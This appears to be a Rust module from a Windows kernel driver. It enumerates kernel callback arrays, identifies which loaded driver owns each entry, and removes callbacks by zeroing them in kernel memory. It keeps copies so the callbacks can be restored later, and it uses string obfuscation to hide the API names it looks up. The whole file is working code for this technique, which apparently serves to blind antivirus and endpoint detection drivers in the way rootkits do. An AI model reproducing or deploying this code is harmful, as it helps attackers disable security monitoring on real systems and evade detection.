use {
    obfstr::obfstr,
    alloc::vec::Vec,
    crate::utils::uni,
    find_callback::find_callback_address,
    spin::{Mutex, lazy::Lazy},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY, 
    shared::structs::{CallbackInfoInput, CallbackInfoOutput, CallbackRestaure}, 
    wdk_sys::{ntddk::MmGetSystemRoutineAddress, NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL}
};

mod find_callback;

/// Variable that stores callbacks that have been removed
static mut INFO_CALLBACK_RESTAURE: Lazy<Mutex<Vec<CallbackRestaure>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(40)));

/// Structure representing the Callback.
pub struct Callback;

impl Callback {
    /// Restore a callback from the specified routine.
    /// 
    /// # Parameters
    /// - `target_callback`: Pointer to the callback information input.
    /// 
    /// # Returns
    /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    ///
    pub unsafe fn restore_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let mut callback_info = INFO_CALLBACK_RESTAURE.lock();
        let callback_type = (*target_callback).callback;
        let index = (*target_callback).index;

        if let Some(index) = callback_info.iter().position(|c| c.callback == callback_type && c.index == index) {
            let address = match find_callback_address(&(*target_callback).callback) {
                Some(addr) => addr,
                None => return STATUS_UNSUCCESSFUL,
            };

            let addr = address.offset((callback_info[index].index * 8) as isize);
            *(addr as *mut u64) = callback_info[index].address;
            callback_info.remove(index);    
        } else {
            log::error!("Callback not found for type {:?} at index {}", callback_type, index);
            return STATUS_UNSUCCESSFUL;
        }

        STATUS_SUCCESS
    }

    /// Removes a callback from the specified routine.
    /// 
    /// # Parameters
    /// - `target_callback`: Pointer to the callback information input.
    /// 
    /// # Returns
    /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    ///
    pub unsafe fn remove_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let address = match find_callback_address(&(*target_callback).callback) {
            Some(addr) => addr,
            None => return STATUS_UNSUCCESSFUL,
        };

        let index = (*target_callback).index as isize;

        let addr = address.offset(index * 8);
        let callback_restaure = CallbackRestaure {
            index: (*target_callback).index,
            callback: (*target_callback).callback,
            address: *(addr as *mut u64)
        };

        let mut callback_info = INFO_CALLBACK_RESTAURE.lock();
        callback_info.push(callback_restaure);

        *(addr as *mut u64) = 0;

        log::info!("Callback removed at index {}", index);

        STATUS_SUCCESS
    }

    /// Searches for a module associated with a callback and updates callback information.
    /// 
    /// # Parameters
    /// - `target_callback`: Pointer to the callback information input.
    /// - `callback_info`: Pointer to the callback information output.
    /// - `information`: Pointer to a variable to store information size.
    /// 
    /// # Returns
    /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    ///
    pub unsafe fn search_module(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> NTSTATUS {
        let address = match find_callback_address(&(*target_callback).callback) {
            Some(addr) => addr,
            None => return STATUS_UNSUCCESSFUL,
        };

        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
        let func = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;

        if func.is_null() {
            log::error!("PsLoadedModuleList is null");
            return STATUS_UNSUCCESSFUL;
        }

        let mut list_entry = (*func).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
        let mut module_count = 0;

        let start_entry = list_entry;
        while !list_entry.is_null() && list_entry != func {
            module_count += 1;
            list_entry = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
        }

        log::info!("Number of loaded modules: {}", module_count);

        list_entry = start_entry;

        for i in 0..64 {
            let addr = address.cast::<u8>().offset(i * 8);
            let callback = *(addr as *const u64);

            if callback == 0 {
                continue;
            }

            // Iterate over the loaded modules
            for _ in 0..module_count {
                let buffer = core::slice::from_raw_parts(
                    (*list_entry).BaseDllName.Buffer,
                    ((*list_entry).BaseDllName.Length / 2) as usize,
                );

                let start_address = (*list_entry).DllBase;
                let image_size = (*list_entry).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;
                let raw_pointer = *((callback & 0xfffffffffffffff8) as *const u64);

                if raw_pointer > start_address as u64 && raw_pointer < end_address {
                    // Module name
                    let name = &mut (*callback_info.offset(i)).name[..buffer.len()];
                    core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            
                    // Module address
                    (*callback_info.offset(i)).address = callback as usize;

                    // Module index
                    (*callback_info.offset(i)).index = i as u8;
            
                    *information += core::mem::size_of::<CallbackInfoOutput>();
                    break;
                }

                // Go to the next module in the list
                list_entry = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset list_entry for next callback
            list_entry = start_entry;
        }

        STATUS_SUCCESS
    }
}

